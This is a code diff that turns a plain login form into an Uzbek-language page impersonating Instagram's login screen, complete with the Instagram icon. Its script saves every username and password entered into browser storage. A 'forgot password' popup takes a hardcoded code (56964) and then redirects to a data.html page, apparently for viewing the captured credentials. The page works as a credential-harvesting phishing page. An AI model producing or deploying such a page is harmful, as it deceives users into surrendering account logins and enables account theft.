@@ -1,116 +1,198 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="uz">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
+<title>Instagram Login</title>
 
 <style>
-body {
-  margin: 0;
-  background: #0f0f12;
-  font-family: Arial;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  color: white;
+body{
+  margin:0;
+  background:#000;
+  font-family:Arial;
+  color:#fff;
 }
 
-.box {
-  width: 360px;
-  background: #1b1b20;
-  padding: 25px;
-  border-radius: 14px;
+/* TOP BAR */
+.top{
+  display:flex;
+  justify-content:space-between;
+  padding:15px;
+  color:#aaa;
+  font-size:14px;
 }
 
-input {
-  width: 100%;
-  padding: 12px;
-  margin: 10px 0;
-  border-radius: 10px;
-  border: 1px solid #333;
-  background: #111;
-  color: white;
+/* MAIN */
+.container{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  margin-top:50px;
 }
 
-button {
-  width: 100%;
-  padding: 12px;
-  border-radius: 25px;
-  border: none;
-  background: #0a3a75;
-  color: white;
-  cursor: pointer;
-  margin-top: 5px;
+/* ICON FRAME */
+.logo-card{
+  width:110px;
+  height:110px;
+  background:#111;
+  border:1px solid #333;
+  border-radius:20px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin-bottom:25px;
+  overflow:hidden; /* 🔥 muhim */
+  box-shadow:0 0 15px rgba(255,255,255,0.05);
 }
 
-.forgot {
-  text-align: center;
-  margin-top: 15px;
-  cursor: pointer;
-  color: #aaa;
+/* ICON IMAGE */
+.logo-card img{
+  width:100%;
+  height:100%;
+  object-fit:cover; /* 🔥 ramkaga mos */
+  transform:scale(1.05);
 }
 
-.forgot:hover {
-  text-decoration: underline;
+/* INPUT */
+input{
+  width:85%;
+  max-width:320px;
+  padding:14px;
+  margin:6px 0;
+  background:#121212;
+  border:1px solid #333;
+  border-radius:10px;
+  color:#fff;
+  outline:none;
 }
 
-#popup {
-  display: none;
-  margin-top: 10px;
+/* BUTTON */
+button{
+  width:85%;
+  max-width:320px;
+  padding:14px;
+  margin-top:10px;
+  background:#1877f2;
+  border:none;
+  border-radius:25px;
+  color:#fff;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+/* FORGOT */
+.forgot{
+  margin-top:15px;
+  color:#ccc;
+  font-size:14px;
+  cursor:pointer;
+}
+
+/* POPUP */
+.popup{
+  display:none;
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.7);
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  width:300px;
+  background:#1b1b20;
+  padding:20px;
+  border-radius:12px;
+}
+
+.box input{
+  width:100%;
+}
+
+.close{
+  background:red;
+  margin-top:10px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="box">
-  <h2>Login</h2>
+<div class="top">
+  <div>←</div>
+  <div>O'zbek ▼</div>
+  <div></div>
+</div>
 
-  <input id="user" type="text" placeholder="Username">
-  <input id="pass" type="password" placeholder="Password">
+<div class="container">
 
-  <button onclick="login()">Log in</button>
-
-  <div class="forgot" onclick="showBox()">Forgot password?</div>
-
-  <!-- 🔐 PASSWORD INPUT POPUP -->
-  <div id="popup">
-    <input id="secret" type="password" placeholder="Enter secret code">
-    <button onclick="checkCode()">Submit</button>
+  <!-- ICON -->
+  <div class="logo-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
   </div>
+
+  <input type="text" id="user" placeholder="Telefon, email yoki login">
+  <input type="password" id="pass" placeholder="Parol">
+
+  <button onclick="save()">Kirish</button>
+
+  <div class="forgot" onclick="openPopup()">Parolni unutdingizmi?</div>
 
 </div>
 
+<!-- POPUP -->
+<div class="popup" id="popup">
+  <div class="box">
+    <h3>Parolni kiriting</h3>
+    <input type="password" id="code" placeholder="12345">
+    <button onclick="check()">Kirish</button>
+    <button class="close" onclick="closePopup()">Yopish</button>
+  </div>
+</div>
+
 <script>
-function login() {
+
+// SAVE USER
+function save(){
   let user = document.getElementById("user").value;
   let pass = document.getElementById("pass").value;
 
-  let data = JSON.parse(localStorage.getItem("users") || "[]");
-  data.push({ user, pass });
+  if(user === "" || pass === ""){
+    alert("To‘ldiring");
+    return;
+  }
 
-  localStorage.setItem("users", JSON.stringify(data));
+  let users = JSON.parse(localStorage.getItem("users")) || [];
+  users.push({user, pass});
+  localStorage.setItem("users", JSON.stringify(users));
 
-  alert("Saved!");
+  alert("Saqlandi ✔");
 }
 
-// forgot password bosilganda input chiqadi
-function showBox() {
-  document.getElementById("popup").style.display = "block";
+// OPEN POPUP
+function openPopup(){
+  document.getElementById("popup").style.display = "flex";
 }
 
-// 🔐 parol tekshirish
-function checkCode() {
-  let code = document.getElementById("secret").value;
+// CLOSE POPUP
+function closePopup(){
+  document.getElementById("popup").style.display = "none";
+}
 
-  if (code === "56964") {
+// CHECK PASSWORD
+function check(){
+  let code = document.getElementById("code").value;
+
+  if(code === "56964"){
     window.location.href = "data.html";
   } else {
-    alert("Wrong code!");
+    alert("Noto‘g‘ri parol!");
   }
 }
+
 </script>
 
 </body>
